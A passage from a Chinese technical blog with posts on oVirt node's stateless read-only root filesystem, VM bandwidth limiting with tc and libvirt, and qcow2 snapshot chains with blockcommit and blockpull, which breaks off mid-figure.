<p>[2] <a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html">http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html</a></p>
</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bash">bash</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/exitcode">exitcode</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="简单分析ovirt的stateless实现机制"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/03/14/ovirt-stateless">Ovirt中的stateless实现机制分析</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-14T00:00:00.000Z" itemprop="datePublished">2013年3月14日</time> · <!-- -->阅读需 10 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>我发现ovirt的node也就是运行虚拟机的主机被设计成了这样：整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，明白了为什么需要这种stateless也就是无状态的设计</p>
</blockquote>
<h2 id="ovirt简介">Ovirt简介</h2>
<p>这是来自centos wiki中的描述：</p>
<blockquote>
<p>oVirt 是个管理虚拟化的应用程序。言下之意就是你可利用 oVirt 的管理界面（oVirt 引擎）来管理硬件节点、存储及网络资源，并部署及监控在你的数据中心内运行的虚拟机器。
如果你熟识 VMware 的产器，oVirt 在理念上与 vSphere 类同。Red Hat 企业级虚拟化产品以 oVirt 作为基础，这个上游计划内开发的新功能，日后亦会在获支持的产品内出现。</p>
</blockquote>
<p>ovirt是一套虚拟化管理的系统，其对标产品是vmware的vsphere，它分为ovirt-engine和ovirt-node，可以用ovirt的这套系统来管理虚拟机群，现在虚拟化相关产品众多，微软，vmware，oracle等都在做这方面的产品，于是IBM红帽ubuntu等厂商就联合起来开始搞这个东西了，红帽很早就开始投入kvm了，红帽做的是RHEV的整套系统，也分为node和engine只是名字不一样，后来干脆就把node的RHEV-H给贡献出来，大家一起搞ovirt了。前几天我也试用了一下ovirt和RHEV，发现他们的node也就是运行虚拟机的主机被设计成了这样: 整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，才知道这叫stateless，无状态，这么做的好处是运行环境和存储分离，提高整体可用性。在分析了ovirt中的stateless实现机制之后，下面将在centos6上尝试手工配置，过程中请教了几位ovirt的开发,再次表示感谢</p>
<h2 id="关于stateless">关于stateless</h2>
<p>这种stateless的设计来自很早之前红帽在fedora里面做的尝试，目的是把系统做成liveCD，下面是一些关于stateless的描述：</p>
<pre><code>read-only root file system(stateless linux)
Readonly root support.
This was add to Fedora for Stateless Linux, i.e. for creating live Fedora CDs.
How to use:
   * Edit `/etc/sysconfig/readonly-root`. Set &#x27;READONLY&#x27; to &#x27;yes&#x27;.
   * Add any exceptions that need to be writable that aren&#x27;t in the stock `/etc/rwtab` to an /etc/rwtab.d file. (See below)
How it works:
   * On boot, we mount a tmpfs (by default, at /var/lib/stateless/writable), and then parse `/etc/rwtab` and `/etc/rwtab.d/*` for things to put there.
These files have the format:
`&lt;type&gt;  &lt;path&gt;`

* Types are as follows:
  * empty: An empty path. Example:
              `empty     /tmp`
  * dirs: A directory tree that is copied, empty. Example:
              `dirs      /var/run`
  * files: A file or directory tree that is copied intact. Example:
              `files     /etc/resolv.conf`

A stock rwtab is shipped with common things that need mounted.
When your computer comes back up, the root and any other system
partitions will be mounted read-only. All the files and directories
listed in `/etc/rwtab` will be mounted read-write on a tmpfs filesystem.
You can add additional files and directories to rwtab to make them
writable after reboot.

Note that this system is stateless. When you reboot again, everything
written to the tmpfs filesystem vanishes and the system will be exactly
as it was the last time it was booted. You could add a writable
filesystem on disk or NFS for writing files you want to retain after
rebooting.

Take a look at `/etc/rc.d/rc.sysinit` to see how the magic is done.
This capability is a &quot;technology preview&quot; (beta) and is buggy. Note that
`/etc/mtab` and thus &quot;mount&quot; do not show the complete list of filesystems
because the /etc directory is on a read-only filesystem. /proc/mounts
always shows the correct mount information. You could update `/etc/mtab`
from /proc/mounts to correct it both after boot and after running the
mount or umount commands to change mounts.

Run `fgrep -v rootfs /proc/mounts &gt;/etc/mtab` to correct `/etc/mtab`.
Note that mounting or symlinking /proc/mounts to /etc/mtab causes other
problems such as breaking the df command.

You can change your read-only root filesystem to read-write mode
immediately with this command run by the root user:
`mount -n -o remount,rw /`
</code></pre>
<h2 id="分析其实现机制">分析其实现机制</h2>
<p>下面把分析过程记录下来：</p>
<p>首先我看到的是fstab文件</p>
<p>/etc/fstab</p>
<pre><code>/dev/root / ext2 defaults,ro,noatime 0 0
devpts /dev/pts devpts gid=5,mode=620 0 0
tmpfs /dev/shm tmpfs defaults 0 0
proc /proc proc defaults 0 0
sysfs /sys sysfs defaults 0 0
/dev/HostVG/Config /config ext4 defaults,noauto,noatime 0 0
debugfs /sys/kernel/debug debugfs 0 0
/dev/HostVG/Swap swap swap defaults 0 0
/dev/HostVG/Logging /var/log ext4 defaults,noatime 0 0
/dev/HostVG/Data /data ext4 defaults,noatime 0 0
/data/images /var/lib/libvirt/images bind bind 0 0
/data/core /var/log/core bind bind 0 0
</code></pre>
<p>这里要注意的地方就是root后面的ro，也就是说被挂载成了只读，这说明stateless是在挂载磁盘之前就已经完成，那肯定跟系统启动相关，
接着我们找到rc.sysinit这个在系统启动阶段执行的脚本中下面这段内容:</p>
<p>/etc/rc.d/rc.sysinit</p>
<pre><code class="language-bash">for file in /etc/statetab /etc/statetab.d/* ; do
    is_ignored_file &quot;$file&quot; &amp;&amp; continue
    [ ! -f &quot;$file&quot; ] &amp;&amp; continue

    if [ -f &quot;$STATE_MOUNT/$file&quot; ] ; then
        mount -n --bind &quot;$STATE_MOUNT/$file&quot; &quot;$file&quot;
    fi

    for path in $(grep -v &quot;^#&quot; &quot;$file&quot; 2&gt;/dev/null); do
        mount_state &quot;$path&quot;
        [ -n &quot;$SELINUX_STATE&quot; -a -e &quot;$path&quot; ] &amp;&amp; restorecon -R &quot;$path&quot;
    done
done
</code></pre>
<p>这段shell里面牵扯到了个/etc/statetab,而且通过对比普通系统还发现其他地方的不同</p>
<p>diff rc.sysinit /etc/rc.sysinit</p>
<pre><code>102a103,108
&gt; elif [[ &quot;$system_release&quot; =~ &quot;CentOS&quot; ]]; then
&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;36m&quot;
&gt; echo -en &quot;CentOS&quot;
&gt; [ &quot;$BOOTUP&quot; = &quot;color&quot; ] &amp;&amp; echo -en &quot;\\033[0;39m&quot;
&gt; PRODUCT=$(sed &quot;s/CentOS \(.*\) \?release.*/\1/&quot; /etc/system-release)
&gt; echo &quot; $PRODUCT&quot;
499c505
&lt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev
---
&gt; action $&quot;Mounting local filesystems: &quot; mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev
501c507
&lt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev
---
&gt; action $&quot;Mounting local filesystems: &quot; mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev
</code></pre>
<p>接着看看这个/etc/statetab文件是个什么样子的：</p>
<p>/etc/statetab</p>
<pre><code># A list of paths which should be bind-mounted from a
# partition dedicated to persistent data
#
# See $STATE_LABEL in /etc/sysconfig/readonly-root
#
# Examples:
#
# /root
# /etc/ssh
# /var/spool/mail
</code></pre>
<p>顺藤摸瓜我们发现和/etc/sysconfig/readonly-root这个文件有关，从文件名上即可得知和只读的关联：</p>
<p>/etc/sysconfig/readonly-root</p>
<pre><code class="language-bash">Set to &#x27;yes&#x27; to mount the system filesystems read-only.
READONLY=yes
# Set to &#x27;yes&#x27; to mount various temporary state as either tmpfs
# or on the block device labelled RW_LABEL. Implied by READONLY
TEMPORARY_STATE=no
# Place to put a tmpfs for temporary scratch writable space
RW_MOUNT=/var/lib/stateless/writable
# Label on local filesystem which can be used for temporary scratch space
RW_LABEL=stateless-rw
# Options to use for temporary mount
RW_OPTIONS=
# Label for partition with persistent data
STATE_LABEL=CONFIG 
# Where to mount to the persistent data
STATE_MOUNT=/config
# Options to use for peristent mount
STATE_OPTIONS=
# NFS server to use for persistent data?
CLIENTSTATE=
</code></pre>
<p>就是这个了，首先它把READONLY设置为yes，然后使用设备的LABEL号来指定需要挂载为读写的设备，然后就是挂载的位置STATE_MOUNT</p>
<p>同时还有/etc/rwtab以及rwtab.d目录与这个有关：
/etc/rwtab</p>
<pre><code>#files /etc/adjtime
#files /etc/ntp.conf
#files /etc/resolv.conf
#files /etc/lvm/.cache
#files /etc/lvm/archive
#files /etc/lvm/backup
</code></pre>
<p>上面这几项在ovirt-node里是被注释掉了的，它使用自己的方式来变更这几个文件</p>
<p>/etc/rwtab.d/ovirt</p>
<pre><code>files /etc
dirs /var/lib/multipath
dirs /var/lib/net-snmp
dirs /var/lib/dnsmasq
files /root/.ssh
dirs /root/.uml
dirs /root/.virt-manager
dirs /home/admin/.virt-manager
files /var/cache/libvirt
files /var/empty/sshd/etc/localtime
files /var/lib/libvirt
files /var/lib/multipath
files /var/cache/multipathd
empty /mnt
empty /live
files /boot
empty /boot-kdump
empty /cgroup
</code></pre>
<p>上面这些是ovirt自定义的。最后就是看/config下面的files文件:</p>
<p>/config/files</p>
<pre><code>/etc/fstab
/etc/shadow
/etc/default/ovirt
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_rsa_key.pub
/etc/iscsi/initiatorname.iscsi
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/sysconfig/network-scripts/ifcfg-breth0
/etc/sysconfig/network-scripts/ifcfg-eth1
/etc/ntp.conf
/etc/sysconfig/network
/etc/hosts
/etc/shadow
/etc/ssh/sshd_config
</code></pre>
<p>此列表内的文件就是rc.sysinit需要读取的，把他们一个个挂载为读写，这样就实现了可修改配置文件白名单，于是我就动手修改了系统里的这些文件，重启，一切看似正常，但是当关机的时候新的问题出现了，关机的时候提示/etc无法被卸载，为什么呢，然后就找到与关机有关的脚本：</p>
<p>diff /etc/rc.d/init.d/halt.orig /etc/rc.d/init.d/halt</p>
<pre><code>141c141
&lt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/dev/{next}
---
&gt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/etc|^\/dev/{next}
</code></pre>
<p>原来在halt文件里也做了“手脚”，把/etc给加了进去，重启，修改，关机，一切正常。</p>
<h2 id="参考文档">参考文档</h2>
<p>下面是可以参考的文档</p>
<ul>
<li><a href="http://fedoraproject.org/wiki/StatelessLinux/PrepareImage">http://fedoraproject.org/wiki/StatelessLinux/PrepareImage</a></li>
<li><a href="http://fedoraproject.org/wiki/StatelessLinux/HOWTO">http://fedoraproject.org/wiki/StatelessLinux/HOWTO</a></li>
<li><a href="http://blog.csdn.net/jcwkyl/article/details/6120547">http://blog.csdn.net/jcwkyl/article/details/6120547</a></li>
<li><a href="http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem">http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem</a></li>
<li>FYI: <a href="http://ovirt.org/wiki/File:Ovirt-node.pdf">http://ovirt.org/wiki/File:Ovirt-node.pdf</a> (page 26)</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/ovirt">ovirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/stateless">stateless</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/03/01/libvirt-tc-bandwidth-control">使用libvirt和tc实现vm带宽控制</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-01T00:00:00.000Z" itemprop="datePublished">2013年3月1日</time> · <!-- -->阅读需 4 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>在kvm虚拟机管理的过程当中，对虚拟机带宽进行良好的控  制是十分重要的。</p>
</blockquote>
<p>linux系统当中对网络带宽的控制一般都是使用tc命令实现，tc即是traffic control的缩写，在<a href="http://linux-ip.net/articles/Traffic-Control-HOWTO/">这里</a>可以找到有关tc命令的内容。</p>
<p>当然你可以手动使用tc命令来处理这些事情，比如使用cbq队列，htb队列等，都是可以实现的，网上找找应该有很多关于这方面的资料，</p>
<h2 id="cbq队列示例">cbq队列示例</h2>
<p>比如下面就是使用cbq队列限制src ip为192.168.1.102发送数据包的速率:</p>
<h3 id="1建立cbq队列">1.建立cbq队列</h3>
<pre><code>tc qdisc add dev eth0 root handle 1: cbq avpkt 1000 bandwidth 100mbit
</code></pre>
<h3 id="2建立带宽限制分类">2.建立带宽限制分类</h3>
<pre><code>tc class add dev eth0 parent 1: classid 1:1 cbq rate 60mbit allot 1500 prio 5 bounded isolated
tc class add dev eth0 parent 1: classid 1:2 cbq rate 70mbit allot 1500 prio 5 bounded isolated
tc class add dev eth0 parent 1: classid 1:3 cbq rate 80mbit allot 1500 prio 5 bounded isolated
</code></pre>
<h3 id="3建立过滤器">3.建立过滤器</h3>
<p>绑定指定带宽限制类型至指定虚拟机ip:</p>
<pre><code>tc filter add dev eth0 parent 1: protocol ip prio 16 u32 match ip src 192.168.1.102 flowid 1:2
</code></pre>
<h2 id="htb队列示例">htb队列示例</h2>
<p>我们可以在母机上给vm对应的虚拟网卡增加tc规则，使用htb队列，一个可用的脚本示例如下：</p>
<pre><code class="language-bash"># add interface bandwidth limit
# usage: tc_add iface in_kbps out_kbps
tc_add() {
    local iface=$1
    local in_bw=$2
    local out_bw=$3
    local in_average=&quot;${in_bw}kbps&quot;
    local in_peak=&quot;${in_bw}kbps&quot;
    local out_average=&quot;${out_bw}kbps&quot;
    local out_peak=&quot;${out_bw}kbps&quot;
    local burst=&quot;2kb&quot;
    local mtu=1500
    local r2q=$((in_bw*1000/mtu-1))
    local tc=&quot;/sbin/tc&quot;
    [ $r2q -lt 1 ] &amp;&amp; r2q=1
    if [ $in_bw != 0 ]; then
        $tc qdisc add dev $iface root handle 1: htb default 2 r2q $r2q
        $tc class add dev $iface parent 1: classid 1:1 htb rate $in_average \
            ceil $in_peak burst $burst cburst $burst
        $tc class add dev $iface parent 1:1 classid 1:2 htb rate $in_average \
            ceil $in_peak burst $burst cburst $burst
        $tc qdisc add dev $iface parent 1:2 handle 2: sfq perturb 10
        $tc filter add dev $iface parent 1:0 protocol ip handle 1 fw flowid 1
    fi
    if [ $out_bw != 0 ]; then
        $tc qdisc add dev $iface ingress
        $tc filter add dev $iface parent ffff: protocol ip u32 match ip src \
            0.0.0.0/0 police rate $out_average burst ${out_bw}kb mtu 64kb drop \
            flowid :1
    fi
}

# clean up interface bandwidth limit
# usage: tc_del iface
tc_del() {
    local iface=$1
    local tc=&quot;/sbin/tc&quot;
    $tc qdisc del dev $iface root &amp;&gt;&gt;/dev/null
    sleep 0.1
    $tc qdisc del dev $iface ingress &amp;&gt;&gt;/dev/null
}

</code></pre>
<h2 id="libvirt中的带宽控制">libvirt中的带宽控制</h2>
<p>我比较推荐的方法还是直接使用libvirt，libvirt 中已经集成了带宽控制的功能，下面是关于带宽控制部分的xml描述:</p>
<p>使用方法：在网卡interface中加入</p>
<pre><code class="language-xml">&lt;bandwidth&gt;
&lt;inbound average=&#x27;1000&#x27; peak=&#x27;5000&#x27; burst=&#x27;1024&#x27;/&gt;
&lt;outbound average=&#x27;128&#x27; peak=&#x27;256&#x27; burst=&#x27;256&#x27;/&gt;
&lt;/bandwidth&gt;
</code></pre>
<p>以下是关于各项参数的解释，获取最新的信息可以参考<a href="http://www.libvirt.org/">libvirt文档</a>.</p>
<ul>
<li>
<p>mandatory attribute:</p>
<ul>
<li>average: It specifies average bit rate on interface being shaped.</li>
</ul>
</li>
<li>
<p>optional attributes:</p>
<ul>
<li>peak: which specifies maximum rate at which interface can send data,</li>
<li>burst: amount of bytes that can be burst at peak speed.</li>
</ul>
</li>
</ul>
<p>Accepted values: integer numbers.</p>
<p>units:</p>
<ul>
<li>average: kilobytes per second</li>
<li>peak: kilobytes per second</li>
<li>burst: kilobytes.</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/tc">tc</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bandwidth">bandwidth</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="show how to create snapshot with libvirt and qemu-img."><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull">浅析qcow2镜像文件的快照合并</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-11-23T00:00:00.000Z" itemprop="datePublished">2012年11月23日</time> · <!-- -->阅读需 17 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>这是一篇关于snapshots, blockpull, blockcommit的的介绍.作者和with Eric Blake, Jeff Cody,Kevin Wolf以及很多IRC和mailing lists里面的同学大量讨论以及作者大量的特向测试的基础之上总结出来的</p>
</blockquote>
<h2 id="基础知识">基础知识</h2>
<p>一个虚拟机快照可被看作是虚拟机的在某个指定时间的视图（包括他的操作系统和所有的程序）.据此，某可以还原到一个之前的完整的状态，或者在guest运行的时候做个备份.所以，在我们继续深入之前我们必须搞懂两个名词：backing files和overlays .</p>
<h3 id="qcow2-backing-files-与-overlays">QCOW2 backing files 与 overlays</h3>
<p>qcow2（qemu copy-on-write）具有创建一个base-image，以及在base-image（即backing file）的基础上创建多个copy-on-write overlays镜像的能力.backing files和overlays十分有用，可以迅速的创建瘦装备虚拟机的实例，特别是在开发测试的时候可以让你迅速的回滚到之前的某个已知状态，丢弃overlay.</p>
<p>Figure-1</p>
<pre><code>.--------------.    .-------------.    .-------------.    .-------------.
|              |    |             |    |             |    |             |
| RootBase     |&lt;---| Overlay-1   |&lt;---| Overlay-1A  &lt;--- | Overlay-1B  |
| (raw/qcow2)  |    | (qcow2)     |    | (qcow2)     |    | (qcow2)     |
&#x27;--------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;    &#x27;-------------&#x27;
</code></pre>
<p>上图表明rootbase是overlay-1的backing file，以此类推.</p>
<p>Figure-2</p>
<pre><code>.-----------.   .-----------.   .------------.  .------------.  .------------.
|           |   |           |   |            |  |            |  |            |
| RootBase  |&lt;--- Overlay-1 |&lt;--- Overlay-1A &lt;--- Overlay-1B &lt;--- Overlay-1C |
|           |   |           |   |            |  |            |  | (Active)   |
&#x27;-----------&#x27;   &#x27;-----------&#x27;   &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;
   ^    ^
   |    |
   |    |       .-----------.    .------------.
   |    |       |           |    |            |
   |    &#x27;-------| Overlay-2 |&lt;---| Overlay-2A |
   |            |           |    | (Active)   |
   |            &#x27;-----------&#x27;    &#x27;------------&#x27;
   |
   |
   |            .-----------.    .------------.
   |            |           |    |            |
   &#x27;------------| Overlay-3 |&lt;---| Overlay-3A |
                |           |    | (Active)   |
                &#x27;-----------&#x27;    &#x27;------------&#x27;
</code></pre>
<p>上图表明我们可以只用单个backing file来创建多条链.</p>
<p>注意 : backing file 总是 只读 打开的. 换言之, 一旦新快照被创建，他的后端文件就不能被修改,(快照依赖于后端文件的这种状态).了解更多参见后面的(&#x27;blockcommit&#x27; 节) .</p>
<p>示例 :</p>
<pre><code>[FedoraBase.img] ----- &lt;- [Fed-guest-1.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-1A]
                 \
                  \--- &lt;- [Fed-guest-2.qcow2] &lt;- [Fed-w-updates.qcow2] &lt;- [Fedora-guest-with-updates-2A]
</code></pre>
<p>（注意箭头的方向，Fed-w-updates.qcow2 的backing file是 Fed-guest-1.qcow2）</p>
<p>上面的示例中可以看到 FedoraBase.img 安装了一个fedora17系统，并作为我们的backing file.现在这个backing file将作为模板快速的创建两个瘦装备实例，和 Figure-2 道理是一样的.</p>
<h2 id="具体操作">具体操作</h2>
<p>使用qemu-img为单个backing file来创建两个fedora的瘦装备克隆:</p>
<pre><code># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \
  /export/vmimages/Fedora-guest-1.qcow2

# qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \
  /export/vmimages/Fedora-guest-2.qcow2
</code></pre>
<p>现在，上面创建出来的两个镜像 Fedora-guest-1 &amp; Fedora-guest-2 都可以用来启动一个虚拟机，继续我们的示例，现在我们需要创建一个f17的实例，但是这次我们需要创建的是具有完整的更新的实例，这时可以创建另外一个overlay（Fedora-guest-with-updates-1A）而这个overlay的backing file是&#x27;Fed-w-updates.qcow2&#x27;（一个包含了完整更新的镜像）:</p>
<pre><code># qemu-img create -b /export/vmimages/Fed-w-updates.qcow2 -f qcow2 \
   /export/vmimages/Fedora-guest-with-updates-1A.qcow2
</code></pre>
<p>我们可以使用qemu-img命令来查看镜像的信息，包括虚拟磁盘大小，使用大小，backing file指向:</p>
<pre><code># qemu-img info /export/vmimages/Fedora-guest-with-updates-1A.qcow2
</code></pre>
<p>注意: 最新版本的qemu-img可以递归查询到整条完整的链:</p>
<pre><code># qemu-img info --backing-chain /export/vmimages/Fedora-guest-with-updates-1A.qcow2
</code></pre>
<p>名词解释Snapshot:</p>
<ul>
<li>内置快照（Internal Snapshots） -- 单个qcow2镜像文件存储了包括数据以及快照的状态信息，</li>
</ul>
<p>内置快照又可以细分一下:-</p>
<ul>
<li>
<p>内置磁盘快照（Internal disk snapshot）:</p>
</li>
<li>
<p>快照点的磁盘状态，数据和快照保存在单个qcow2文件中，虚拟机运行状态和关闭状态都可以创建.</p>
</li>
</ul>
<p>Libvirt 使用 &#x27;qemu-img&#x27; 命令创建关机状态的磁盘快照.Libvirt 使用 &#x27;savevm&#x27; 命令创建运行状态的磁盘快照.</p>
<ul>
<li>内置系统还原点（Internal system checkpoint）:</li>
</ul>
<p>内存状态，设备状态和磁盘状态，可以为运行中的虚拟机创建，所有信息都存储在同一个qcow2文件中，只有在运行状态才能创建内置系统还原点.</p>
<p>Libvirt 使用&#x27;savevm&#x27; 命令来创建这种快照</p>
<ul>
<li>外置快照（External Snapshots） -- 当一个快照被创建时，创建时当前的状态保存在当前使用的磁盘文件中，即成为一个backing file.此时一个新的overlay被创建出来保存往后的数据.</li>
</ul>
<p>这个也可以细分一下:-</p>
<ul>
<li>外置磁盘快照（External disk snapshot）: 磁盘的快照被保存在一个文件中，创建时间点以后的数据被记录到一个新的qcow2文件中.同样可以在运行和关闭状态创建.</li>
</ul>
<p>Libvirt 使用 &#x27;transaction&#x27; 命令来为运行状态创建这种快照.
Libvirt 使用&#x27;qemu-img&#x27; 命令为关闭状态创建这种快照(截止目前功能还在开发中).</p>
<ul>
<li>外置系统还原点（External system checkpoint）:</li>
</ul>
<p>虚拟机的磁盘状态将被保存到一个文件中，内存和设备的状态将被保存  到另外一个新的文件中，</p>
<p>（这个功能也还在开发中）.</p>
<p>VM状态（VM state）:</p>
<p>保存运行状态虚拟机的内存设备状态信息至文件，可以通过此文件恢复到保存时的状态，有点类似系统的休眠.（注意创建VM状态保存的时候VM磁盘必须是未发生写入改动的）</p>
<p>Libvirt使用 &#x27;migrate&#x27; (to file)命令来完成VM状态转储.</p>
<h2 id="创建快照">创建快照</h2>
<p>每次产生一个外置snapshot，一个 /new/ overlay 镜像就会随之生成，而前一个镜像就变成了一个快照.</p>
<p>diskonly内置快照创建</p>
<p>假如需要为名为&#x27;f17vm1&#x27;的虚拟机创建一个运行态或关闭态的内置快照snap1</p>
<pre><code># virsh snapshot-create-as f17vm1  snap1 snap1-desc
</code></pre>
<p>列出快照列表，使用<em>qemu-img</em>查看info</p>
<pre><code># virsh snapshot-list f17vm1
# qemu-img info /home/kashyap/vmimages/f17vm1.qcow2
</code></pre>
<p>disk-only外置快照创建 :</p>
<p>查看虚拟机磁盘列表</p>
<pre><code># virsh domblklist f17-base
Target     Source
---------------------------------------------
vda        /export/vmimages/f17-base.qcow2

</code></pre>
<p>创建外置disk-only磁盘快照（VM<em>运行态</em>）:</p>
<pre><code># virsh snapshot-create-as --domain f17-base snap1 snap1-desc \
--disk-only --diskspec vda,snapshot=external,file=/export/vmimages/sn1-of-f17-base.qcow2 \
--atomic
Domain snapshot snap1 created
</code></pre>
<ul>
<li>一旦上面的命令被执行，则原来的镜像f17-base将变为backing file，一个新的镜像被创建.</li>
</ul>
<p>现在再列表查看虚拟机磁盘，你会发现新产生的镜像已经投入使用.</p>
<pre><code># virsh domblklist f17-base
Target     Source
----------------------------------------------------
vda        /export/vmimages/sn1-of-f17-base.qcow2

</code></pre>
<p>快照回滚</p>
<p>截止写此文之时，回滚至&#x27;内置快照&#x27;(system checkpoint或disk-only)是可以使用的.</p>
<p>虚拟机f17vm1回滚至快照&#x27;snap1&#x27;</p>
<pre><code># virsh snapshot-revert --domain f17vm1 snap1
</code></pre>
<p>使用 snapshot-revert 回滚 &#x27;外置磁盘快照&#x27; 稍微复杂些，需要涉及到稍微复杂点的问题，需要考虑的是合并&#x27;base&#x27;至&#x27;top&#x27;还是合并&#x27;top&#x27;至&#x27;base&#x27;.也就是说，有两种方式可以选择，外置磁盘快照链的缩短可以使用 blockpull 或 blockcommit .截止目前上游社区仍然在努力完善这项功能.</p>
<h2 id="合并快照文件">合并快照文件</h2>
<p>外置快照非常有用，但这里有一个问题就是如何合并快照文件来缩短链的长度，如上所述这里</p>
<p>有两种方式:</p>
<ul>
<li>blockcommit: 从 top 合并数据到 base (即合并overlays至backing files).</li>
<li>blockpull: 将backing file数据合并至overlay中.从 base 到 top .</li>
</ul>
<h3 id="blockcommit">blockcommit</h3>
<p>blockcommit可以让你将&#x27;top&#x27;镜像(在同一条backing file链中)合并至底层的&#x27;base&#x27;镜像.一旦 blockcommit 执行完成，处于最上面的overlay链关系将被指向到底层的overlay或base.这在创建了很长一条链之后用来缩短链长度的时候十分有用.</p>
<p>下面来个图说明下:</p>
<p>我们现在有一个镜像叫&#x27;RootBase&#x27;，拥有4个外置快照，&#x27;Active&#x27;为当前VM写入数据的，</p>
<p>使用&#x27;blockcommit&#x27;可以有以下多种case :</p>
<p>合并Snap-1, Snap-2 and Snap-3 至 &#x27;RootBase&#x27;
只合并Snap-1 and Snap-2 至 RootBase
只合并Snap-1 至 RootBase
合并Snap-2 至 Snap-1
合并Snap-3 至 Snap-2
合并Snap-2 和 Snap-3 至 Snap-1
注: 合并&#x27;Active&#x27;层(最顶部的overlay)至backing_files的功能还在开发中.</p>
<p>(下图解释case (6))</p>
<p>Figure-3</p>
<pre><code>.------------.  .------------.  .------------.  .------------.  .------------.
|            |  |            |  |            |  |            |  |            |
| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |
|            |  |            |  |            |  |            |  | (Active)   |
&#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;  &#x27;------------&#x27;
                                 /                  |
                                /                   |
                               /  commit data       |
                              /                     |
                             /                      |
                            /                       |
                           v           commit data  |
.------------.  .------------. &lt;--------------------&#x27;           .------------.
|            |  |            |                                  |            |
| RootBase   &lt;---  Snap-1    |&lt;---------------------------------|  Snap-4    |
|            |  |            |       Backing File               | (Active)   |
&#x27;------------&#x27;  &#x27;------------&#x27;                                  &#x27;------------&#x27;
</code></pre>
<p>举个例子，有以下场景：</p>
<p>当前: <code>[base] &lt;- sn1 &lt;- sn2 &lt;- sn3 &lt;- sn4(this is active)</code></p>
<p>目标: <code>[base] &lt;- sn1 &lt;- sn4 (如此来丢弃sn2,sn3)</code></p>
<p>下面有两种方式，method-a更快,method-b 慢些，但是sn2有效可用. (VM运行态).</p>
<p>(method-a):</p>
<pre><code>           # virsh blockcommit --domain f17 vda --base /export/vmimages/sn1.qcow2  \

               --top /export/vmimages/sn3.qcow2 --wait --verbose
</code></pre>
<p>[OR]
(method-b):</p>
<pre><code># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn2.qcow2  \
    --top /export/vmimages/sn3.qcow2 --wait --verbose
# virsh blockcommit --domain f17 vda  --base /export/vmimages/sn1.qcow2  \
    --top /export/vmimages/sn2.qcow2 --wait --verbose
</code></pre>
<p>注: 如果手工执行<em>qemu-img</em>命令完成的话, 现在还只能用method-b.
Figure-4</p>
<pre><code>.------------.  .------------.  .------------.  .------------.  .------------.
